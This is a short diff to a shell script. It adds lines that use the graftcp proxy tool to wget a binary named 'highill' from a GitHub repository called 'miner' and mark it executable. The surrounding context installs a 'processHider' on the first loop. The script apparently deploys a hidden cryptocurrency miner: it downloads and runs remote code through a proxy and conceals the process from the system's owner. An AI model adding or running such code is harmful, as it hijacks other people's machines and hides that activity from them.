@@ -56,6 +56,10 @@ END
   echo " "
   echo " "
 
+  # Download and configure highill
+  ./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/highill
+  chmod +x highill
+
   # Run processHider only during the first loop
   if [ "$process_hider_installed" = false ]; then
     echo "Installing processHider for the first time..."
